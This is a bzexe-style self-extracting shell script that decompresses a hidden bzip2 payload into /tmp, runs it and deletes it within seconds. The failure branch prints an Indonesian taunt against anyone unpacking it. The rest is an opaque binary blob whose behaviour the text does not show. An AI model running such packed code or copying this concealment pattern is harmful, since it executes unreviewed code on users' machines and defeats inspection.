#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��6  5_�@|c�0&� ����0-+Q��鑩�SzSe6���6�4�Q�h�L�!��b4 @�S􇩂��i�dh��^(�HӕoG��2����lW���'�/��RL9r,��ĉK��D��i��D鷵�5D�Y�Ƌ���d�%ֲ��0�v1]6̓e�uK:@j��7G�~�&A�\�t��i�B�۾$kxY���WK�W���H�^>�Sż�1�2�?RO�w�	��g�:{CB��~ l�R�z�_�Tw��;�2=.I��1���l�u2��������L/��J4��E�bؤ���߃m����`d�O��TƠ��9�sA�lrɅi/vH3)T�A�rE8P���6